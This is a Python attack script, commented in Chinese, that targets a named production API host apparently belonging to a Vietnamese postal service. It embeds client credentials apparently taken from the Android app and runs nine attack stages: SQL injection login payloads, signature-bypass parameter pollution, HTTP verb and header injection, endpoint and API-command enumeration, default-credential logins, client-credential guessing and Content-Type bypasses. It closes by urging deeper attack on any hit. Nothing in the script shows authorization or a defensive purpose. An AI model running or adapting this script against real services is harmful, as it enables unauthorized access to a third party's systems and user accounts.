#!/usr/bin/env python3
"""
暴力测试所有可能的攻击向量
死磕到底！
"""

import requests
import json
import urllib3
import base64
import hashlib
from concurrent.futures import ThreadPoolExecutor, as_completed
urllib3.disable_warnings()

BASE_URL = "https://gwmobile.emsone.com.vn"

print("="*70)
print(" 死磕模式：测试所有可能的攻击向量")
print("="*70)

# ================================================================
# 1. SQL注入测试
# ================================================================
print("\n[1] SQL注入测试")

sqli_payloads = [
    "' OR '1'='1",
    "admin' --",
    "' OR 1=1--",
    "admin'/*",
    "' UNION SELECT NULL--",
]

for payload in sqli_payloads:
    headers = {
        'X-Client-ID': 'android_app_987654',
        'X-Client-Secret': 'android_s3cr3t_uvwxzy',
        'Content-Type': 'application/json',
    }
    
    data = {
        "channel": "ANDROID",
        "code": "EMPLOYEE_LOGIN_V2",
        "data": json.dumps({"phone": payload, "password": payload}),
        "signature": ""
    }
    
    try:
        r = requests.post(f"{BASE_URL}/execute", json=data, headers=headers, timeout=5, verify=False)
        result = r.json()
        
        if result.get('Code') not in ['95', '97']:
            print(f"  🎯 SQLi响应: {payload} -> {result.get('Code')}: {result.get('Message')}")
            
    except:
        pass

# ================================================================
# 2. 参数污染测试
# ================================================================
print("\n[2] 参数污染/绕过测试")

# 测试多个signature参数
headers = {
    'X-Client-ID': 'android_app_987654',
    'X-Client-Secret': 'android_s3cr3t_uvwxzy',
    'Content-Type': 'application/json',
    'signature': 'fake1',
}

# 尝试在body中也添加signature
data = {
    "channel": "ANDROID",
    "code": "EMPLOYEE_LOGIN_V2",
    "data": json.dumps({"phone": "test", "password": "test"}),
    "signature": "fake2",
    "Signature": "fake3",  # 大写
}

try:
    r = requests.post(f"{BASE_URL}/execute", json=data, headers=headers, timeout=5, verify=False)
    result = r.json()
    if result.get('Code') not in ['95', '97']:
        print(f"  🎯 参数污染成功: {result}")
except:
    pass

# ================================================================
# 3. HTTP动词篡改
# ================================================================
print("\n[3] HTTP方法测试")

for method in ['GET', 'PUT', 'DELETE', 'PATCH']:
    try:
        if method == 'GET':
            r = requests.get(f"{BASE_URL}/execute?code=EMPLOYEE_LOGIN_V2", headers=headers, timeout=5, verify=False)
        else:
            r = requests.request(method, f"{BASE_URL}/execute", json=data, headers=headers, timeout=5, verify=False)
        
        if r.status_code != 405:  # Method Not Allowed
            print(f"  🎯 {method}方法: HTTP {r.status_code}")
            
    except:
        pass

# ================================================================
# 4. 路径遍历测试
# ================================================================
print("\n[4] 路径遍历/端点发现")

endpoints = [
    "/execute",
    "/api/execute", 
    "/v1/execute",
    "/v2/execute",
    "/mobile/execute",
    "/Execute",  # 大小写
    "/EXECUTE",
    "/execute/",
    "//execute",
    "/execute/../execute",
    "/login",
    "/auth/login",
    "/api/login",
    "/register",
    "/api/register",
]

def test_endpoint(endpoint):
    try:
        r = requests.post(
            f"{BASE_URL}{endpoint}",
            json={"code": "EMPLOYEE_LOGIN_V2", "data": "{}", "signature": ""},
            headers={'X-Client-ID': 'android_app_987654', 'X-Client-Secret': 'android_s3cr3t_uvwxzy'},
            timeout=5,
            verify=False
        )
        
        if r.status_code not in [404, 405]:
            return f"  🎯 {endpoint}: HTTP {r.status_code}, {r.text[:100]}"
    except:
        pass
    return None

with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(test_endpoint, ep) for ep in endpoints]
    for future in as_completed(futures):
        result = future.result()
        if result:
            print(result)

# ================================================================
# 5. Header注入测试
# ================================================================
print("\n[5] Header注入测试")

injection_headers = {
    'X-Client-ID': 'android_app_987654',
    'X-Client-Secret': 'android_s3cr3t_uvwxzy',
    'X-Forwarded-For': '127.0.0.1',
    'X-Original-URL': '/admin',
    'X-Rewrite-URL': '/admin',
    'X-Debug': 'true',
    'X-Test': 'true',
    'Authorization': 'Bearer test',
}

try:
    r = requests.post(
        f"{BASE_URL}/execute",
        json={"code": "EMPLOYEE_LOGIN_V2", "data": "{}", "signature": ""},
        headers=injection_headers,
        timeout=5,
        verify=False
    )
    
    result = r.json()
    if result.get('Code') not in ['95', '97']:
        print(f"  🎯 Header注入成功: {result}")
        
except Exception as e:
    pass

# ================================================================
# 6. 测试所有可能的Code命令
# ================================================================
print("\n[6] 暴力枚举API命令（寻找无签名验证的）")

# 可能的API命令模式
prefixes = ["", "EMPLOYEE_", "SHOP_", "USER_", "ADMIN_", "PUBLIC_", "GUEST_"]
actions = ["LOGIN", "REGISTER", "LIST", "GET", "SEARCH", "INFO", "DETAIL", "CHECK"]
versions = ["", "_V1", "_V2", "_V3"]

test_codes = []
for prefix in prefixes:
    for action in actions:
        for version in versions:
            test_codes.append(f"{prefix}{action}{version}")

# 随机测试50个
import random
random.shuffle(test_codes)

def test_code(code):
    try:
        r = requests.post(
            f"{BASE_URL}/execute",
            json={"channel": "ANDROID", "code": code, "data": "{}", "signature": ""},
            headers={'X-Client-ID': 'android_app_987654', 'X-Client-Secret': 'android_s3cr3t_uvwxzy'},
            timeout=3,
            verify=False
        )
        
        result = r.json()
        if result.get('Code') not in ['95', '97', '98']:
            return f"  🎯 发现: {code} -> {result.get('Code')}: {result.get('Message')}"
    except:
        pass
    return None

print(f"  测试 {min(50, len(test_codes))} 个命令...")

with ThreadPoolExecutor(max_workers=20) as executor:
    futures = [executor.submit(test_code, code) for code in test_codes[:50]]
    for future in as_completed(futures):
        result = future.result()
        if result:
            print(result)

# ================================================================
# 7. 测试默认/常见凭证
# ================================================================
print("\n[7] 默认凭证测试")

default_creds = [
    ("admin", "admin"),
    ("admin", "123456"),
    ("test", "test"),
    ("demo", "demo"),
    ("guest", "guest"),
    ("0000000000", "123456"),
    ("admin@ems.com.vn", "admin123"),
]

for username, password in default_creds:
    try:
        r = requests.post(
            f"{BASE_URL}/execute",
            json={
                "channel": "ANDROID",
                "code": "EMPLOYEE_LOGIN_V2",
                "data": json.dumps({"phone": username, "password": password}),
                "signature": ""
            },
            headers={'X-Client-ID': 'android_app_987654', 'X-Client-Secret': 'android_s3cr3t_uvwxzy'},
            timeout=5,
            verify=False
        )
        
        result = r.json()
        if result.get('Code') == '01':  # 登录失败但签名验证通过
            print(f"  ⚠️ 签名通过但账号错误: {username}/{password}")
        elif result.get('Code') == '00':
            print(f"  🎯🎯🎯 默认凭证成功: {username}/{password}")
            print(json.dumps(result, indent=2, ensure_ascii=False))
            
    except:
        pass

# ================================================================
# 8. 测试不同Client ID/Secret
# ================================================================
print("\n[8] 测试不同的Client凭证")

client_variations = [
    ("android_app_123456", "android_s3cr3t_123456"),
    ("ios_app_987654", "ios_s3cr3t_uvwxzy"),
    ("web_app_987654", "web_s3cr3t_uvwxzy"),
    ("", ""),  # 空凭证
    ("test", "test"),
]

for client_id, client_secret in client_variations:
    try:
        r = requests.post(
            f"{BASE_URL}/execute",
            json={
                "channel": "ANDROID",
                "code": "EMPLOYEE_LOGIN_V2",
                "data": json.dumps({"phone": "test", "password": "test"}),
                "signature": ""
            },
            headers={
                'X-Client-ID': client_id,
                'X-Client-Secret': client_secret,
            },
            timeout=5,
            verify=False
        )
        
        result = r.json()
        if result.get('Code') not in ['98']:  # 98 = Client无效
            print(f"  🎯 有效Client: {client_id}")
            
    except:
        pass

# ================================================================
# 9. Content-Type绕过
# ================================================================
print("\n[9] Content-Type绕过测试")

content_types = [
    'application/x-www-form-urlencoded',
    'text/plain',
    'multipart/form-data',
    'application/xml',
]

for ct in content_types:
    try:
        r = requests.post(
            f"{BASE_URL}/execute",
            data="code=EMPLOYEE_LOGIN_V2&data={}&signature=",
            headers={
                'X-Client-ID': 'android_app_987654',
                'X-Client-Secret': 'android_s3cr3t_uvwxzy',
                'Content-Type': ct,
            },
            timeout=5,
            verify=False
        )
        
        if 'signature' not in r.text.lower():
            print(f"  🎯 绕过Content-Type: {ct}, HTTP {r.status_code}")
            
    except:
        pass

print("\n" + "="*70)
print(" 暴力测试完成")
print("="*70)
print("""
如果发现任何 🎯 标记的结果 → 立即深入测试！
如果全部失败 → 确认必须使用Android环境
""")
